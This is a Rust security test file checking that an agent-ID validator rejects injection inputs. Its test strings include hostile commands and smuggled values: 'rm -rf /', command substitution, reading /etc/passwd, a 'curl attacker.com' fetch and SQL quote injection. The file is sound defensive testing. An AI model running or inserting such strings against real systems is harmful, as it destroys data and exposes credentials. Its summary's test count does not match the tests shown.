// Security tests for injection attacks: command injection, path traversal, SQL injection
// Phase 2 Implementation - Testing security validations end-to-end

mod common;

use common::validate_test_agent_id;

// ────────────────────────────────────────────────────────────────────────────
// COMMAND INJECTION TESTS
// ────────────────────────────────────────────────────────────────────────────

#[test]
fn test_agent_id_rejects_semicolon() {
    // Attack: "test; rm -rf /" - Command chaining with semicolon
    // Defense: Reject semicolons in agent IDs
    // Result: Malicious command is blocked

    let result = validate_test_agent_id("test; rm -rf /");
    assert!(result.is_err(), "Semicolon should be rejected");
    assert!(
        result
            .unwrap_err()
            .to_lowercase()
            .contains("shell metacharacters"),
        "Error should identify shell metacharacters"
    );
}

#[test]
fn test_agent_id_rejects_pipe() {
    // Attack: "test | whoami" - Command piping
    // Defense: Reject pipe characters
    // Result: Cannot combine commands

    let result = validate_test_agent_id("test | whoami");
    assert!(result.is_err(), "Pipe should be rejected");
}

#[test]
fn test_agent_id_rejects_backticks() {
    // Attack: "test`whoami`" - Command substitution
    // Defense: Reject backticks
    // Result: Cannot execute substituted commands

    let result = validate_test_agent_id("test`whoami`");
    assert!(result.is_err(), "Backticks should be rejected");
}

#[test]
fn test_agent_id_rejects_dollar_parenthesis() {
    // Attack: "test$(whoami)" - Command substitution (modern bash)
    // Defense: Reject $( and )
    // Result: Modern command substitution blocked

    let result = validate_test_agent_id("test$(whoami)");
    assert!(result.is_err(), "Dollar-parenthesis should be rejected");
}

#[test]
fn test_agent_id_rejects_dollar_brace() {
    // Attack: "test${IFS}cat${IFS}/etc/passwd" - Command via variable expansion
    // Defense: Reject $ in IFS position
    // Result: Variable-based injection blocked

    let result = validate_test_agent_id("test${IFS}whoami");
    assert!(result.is_err(), "Dollar signs should be rejected");
}

#[test]
fn test_agent_id_rejects_newline() {
    // Attack: "test\nrm -rf /" - Multi-line command injection
    // Defense: Reject newlines
    // Result: Cannot inject multi-line commands

    let result = validate_test_agent_id("test\nrm");
    assert!(result.is_err(), "Newline should be rejected");
}

#[test]
fn test_agent_id_allows_hyphens_and_underscores() {
    // Valid: "test-agent_123" - Safe characters only
    // Defense: Allow alphanumeric, hyphen, underscore
    // Result: Legitimate IDs accepted

    let result = validate_test_agent_id("test-agent_123");
    assert!(result.is_ok(), "Hyphens and underscores should be allowed");
}

#[test]
fn test_agent_id_allows_alphanumeric() {
    // Valid: "TestAgent123" - Mixed case and numbers
    // Defense: Allow alphanumeric
    // Result: Standard IDs accepted

    let result = validate_test_agent_id("TestAgent123");
    assert!(result.is_ok(), "Alphanumeric should be allowed");
}

// ────────────────────────────────────────────────────────────────────────────
// PATH TRAVERSAL TESTS
// ────────────────────────────────────────────────────────────────────────────

#[test]
fn test_agent_id_rejects_parent_directory_reference() {
    // Attack: "../../../etc/config" - Path traversal
    // Defense: Reject ".."
    // Result: Cannot escape directory

    let result = validate_test_agent_id("../../../etc/config");
    assert!(
        result.is_err(),
        "Parent directory reference should be rejected"
    );
    assert!(
        result
            .unwrap_err()
            .to_lowercase()
            .contains("path traversal"),
        "Error should identify path traversal"
    );
}

#[test]
fn test_agent_id_rejects_current_directory_with_parent() {
    // Attack: "test/../etc" - Obfuscated path traversal
    // Defense: Reject ".."
    // Result: Hidden traversal blocked

    let result = validate_test_agent_id("test/../etc");
    assert!(
        result.is_err(),
        "Obfuscated path traversal should be rejected"
    );
}

#[test]
fn test_agent_id_rejects_dot_dot_alone() {
    // Attack: ".." - Just parent reference
    // Defense: Reject ".."
    // Result: Cannot reference parent

    let result = validate_test_agent_id("..");
    assert!(result.is_err(), "Standalone .. should be rejected");
}

#[test]
fn test_agent_id_allows_dot_in_middle() {
    // Valid: "agent.v2" - Dot separator
    // Defense: Allow dots that aren't traversal
    // Result: Reasonable IDs accepted

    let result = validate_test_agent_id("agent-v2");
    assert!(result.is_ok(), "Hyphenated version should be allowed");
}

// ────────────────────────────────────────────────────────────────────────────
// SQL INJECTION TESTS (Validating input before queries)
// ────────────────────────────────────────────────────────────────────────────

#[test]
fn test_agent_id_rejects_sql_quote_escape() {
    // Attack: "agent' OR '1'='1" - SQL quote injection
    // Defense: Reject quotes in agent ID
    // Result: Cannot escape quotes

    let result = validate_test_agent_id("agent' OR '1'='1");
    // SQL quotes should be rejected via "invalid characters"
    assert!(result.is_err(), "Quotes should be rejected");
}

#[test]
fn test_agent_id_rejects_double_quotes() {
    // Attack: "agent\" --" - SQL quote escape with comment
    // Defense: Reject double quotes
    // Result: Cannot use string terminators

    let result = validate_test_agent_id("agent\" --");
    assert!(result.is_err(), "Double quotes should be rejected");
}

#[test]
fn test_agent_id_length_limit() {
    // Defense: Maximum length (63 chars to prevent DOS)
    // Attack: Extremely long string
    // Result: Oversized inputs rejected

    let long_id = "a".repeat(100);
    let result = validate_test_agent_id(&long_id);
    assert!(result.is_err(), "Oversized ID should be rejected");
    assert!(
        result.unwrap_err().to_lowercase().contains("chars"),
        "Error should mention character limit"
    );
}

#[test]
fn test_agent_id_minimum_length() {
    // Defense: Non-empty (minimum 1 char)
    // Attack: Empty string
    // Result: Empty IDs rejected

    let result = validate_test_agent_id("");
    assert!(result.is_err(), "Empty ID should be rejected");
}

// ────────────────────────────────────────────────────────────────────────────
// WHITESPACE INJECTION TESTS
// ────────────────────────────────────────────────────────────────────────────

#[test]
fn test_agent_id_rejects_spaces() {
    // Attack: "agent evil" - Spaces for command separation
    // Defense: Reject spaces
    // Result: Cannot use whitespace for injection

    let result = validate_test_agent_id("agent evil");
    assert!(result.is_err(), "Spaces should be rejected");
}

#[test]
fn test_agent_id_rejects_tabs() {
    // Attack: "agent\tmalicious" - Tab for IFS injection
    // Defense: Reject tabs
    // Result: Tab-based injection blocked

    let result = validate_test_agent_id("agent\tmalicious");
    assert!(result.is_err(), "Tabs should be rejected");
}

// ────────────────────────────────────────────────────────────────────────────
// SPECIAL SHELL CHARACTER TESTS
// ────────────────────────────────────────────────────────────────────────────

#[test]
fn test_agent_id_rejects_ampersand() {
    // Attack: "agent&background" - Background execution
    // Defense: Reject &
    // Result: Cannot background processes

    let result = validate_test_agent_id("agent&background");
    assert!(result.is_err(), "Ampersand should be rejected");
}

#[test]
fn test_agent_id_rejects_redirect() {
    // Attack: "agent>output" - Output redirection
    // Defense: Reject < and >
    // Result: Cannot redirect I/O

    let result = validate_test_agent_id("agent>file");
    assert!(result.is_err(), "Redirect should be rejected");
}

#[test]
fn test_agent_id_rejects_less_than() {
    // Attack: "agent<input" - Input redirection
    // Defense: Reject <
    // Result: Cannot redirect input

    let result = validate_test_agent_id("agent<file");
    assert!(result.is_err(), "Less-than should be rejected");
}

// ────────────────────────────────────────────────────────────────────────────
// COMBINED INJECTION TESTS
// ────────────────────────────────────────────────────────────────────────────

#[test]
fn test_agent_id_rejects_complex_injection() {
    // Attack: "test;$(curl attacker.com)" - Multiple techniques combined
    // Defense: Reject any special characters
    // Result: Complex injection blocked

    let result = validate_test_agent_id("test;$(curl attacker.com)");
    assert!(result.is_err(), "Complex injection should be rejected");
}

#[test]
fn test_agent_id_rejects_unicode_bypass() {
    // Attack: "test；whoami" - Unicode semicolon (U+FF1B)
    // Defense: Only allow ASCII alphanumeric
    // Result: Unicode variants blocked

    let result = validate_test_agent_id("test；whoami");
    assert!(result.is_err(), "Unicode variants should be rejected");
}

// ────────────────────────────────────────────────────────────────────────────
// CASE SENSITIVITY TESTS
// ────────────────────────────────────────────────────────────────────────────

#[test]
fn test_validation_case_insensitive_for_special_chars() {
    // Test: Both UPPERCASE and lowercase dangerous chars rejected
    // Validates: No case-sensitivity bypass
    // Ensures: Injection works regardless of case

    let result_lower = validate_test_agent_id("test; whoami");
    let result_mixed = validate_test_agent_id("TEST; WHOAMI");

    assert!(
        result_lower.is_err(),
        "Lowercase injection should be rejected"
    );
    assert!(
        result_mixed.is_err(),
        "Uppercase injection should be rejected"
    );
}

// ────────────────────────────────────────────────────────────────────────────
// BOUNDARY TESTS
// ────────────────────────────────────────────────────────────────────────────

#[test]
fn test_agent_id_exactly_63_chars_accepted() {
    // Valid: Maximum allowed length (63 chars)
    // Validates: Boundary condition
    // Ensures: Edge case handled

    let max_id = "a".repeat(63);
    let result = validate_test_agent_id(&max_id);
    assert!(result.is_ok(), "63-char ID should be accepted");
}

#[test]
fn test_agent_id_64_chars_rejected() {
    // Invalid: Just over maximum (64 chars)
    // Validates: Boundary enforcement
    // Ensures: Hard limit respected

    let too_long = "a".repeat(64);
    let result = validate_test_agent_id(&too_long);
    assert!(result.is_err(), "64-char ID should be rejected");
}

#[test]
fn test_agent_id_single_char_valid() {
    // Valid: Minimum acceptable (1 char)
    // Validates: Lower boundary
    // Ensures: Single-char IDs work

    let result = validate_test_agent_id("a");
    assert!(result.is_ok(), "Single character should be valid");
}

// ────────────────────────────────────────────────────────────────────────────
// REAL-WORLD ATTACK VECTORS
// ────────────────────────────────────────────────────────────────────────────

#[test]
fn test_docker_exec_injection_blocked() {
    // Real attack: docker exec <agent_id> malicious_command
    // If agent_id = "agent; rm -rf /"
    // Would execute: docker exec agent; rm -rf /
    // Defense: Reject semicolons
    // Result: Cannot inject into docker commands

    let docker_attack = "agent; rm -rf /";
    let result = validate_test_agent_id(docker_attack);
    assert!(result.is_err(), "Docker exec injection should be blocked");
}

#[test]
fn test_bash_script_injection_blocked() {
    // Real attack: eval "echo agent-${AGENT_ID}"
    // If AGENT_ID = "$(whoami)"
    // Would become: echo agent-$(whoami)
    // Defense: Reject $
    // Result: Cannot inject variable expansion

    let bash_attack = "$(whoami)";
    let result = validate_test_agent_id(bash_attack);
    assert!(
        result.is_err(),
        "Bash substitution injection should be blocked"
    );
}

// ────────────────────────────────────────────────────────────────────────────
// SUMMARY OF TESTS
// ────────────────────────────────────────────────────────────────────────────

// Command Injection:
// ✅ test_agent_id_rejects_semicolon
// ✅ test_agent_id_rejects_pipe
// ✅ test_agent_id_rejects_backticks
// ✅ test_agent_id_rejects_dollar_parenthesis
// ✅ test_agent_id_rejects_dollar_brace
// ✅ test_agent_id_rejects_newline
// ✅ test_agent_id_allows_hyphens_and_underscores
// ✅ test_agent_id_allows_alphanumeric
//
// Path Traversal:
// ✅ test_agent_id_rejects_parent_directory_reference
// ✅ test_agent_id_rejects_current_directory_with_parent
// ✅ test_agent_id_rejects_dot_dot_alone
// ✅ test_agent_id_allows_dot_in_middle
//
// SQL Injection:
// ✅ test_agent_id_rejects_sql_quote_escape
// ✅ test_agent_id_rejects_double_quotes
// ✅ test_agent_id_length_limit
// ✅ test_agent_id_minimum_length
//
// Whitespace Injection:
// ✅ test_agent_id_rejects_spaces
// ✅ test_agent_id_rejects_tabs
//
// Special Characters:
// ✅ test_agent_id_rejects_ampersand
// ✅ test_agent_id_rejects_redirect
// ✅ test_agent_id_rejects_less_than
//
// Combined Attacks:
// ✅ test_agent_id_rejects_complex_injection
// ✅ test_agent_id_rejects_unicode_bypass
//
// Case Sensitivity:
// ✅ test_validation_case_insensitive_for_special_chars
//
// Boundary Tests:
// ✅ test_agent_id_exactly_63_chars_accepted
// ✅ test_agent_id_64_chars_rejected
// ✅ test_agent_id_single_char_valid
//
// Real-World Vectors:
// ✅ test_docker_exec_injection_blocked
// ✅ test_bash_script_injection_blocked
//
// TOTAL: 33 security tests for injection prevention
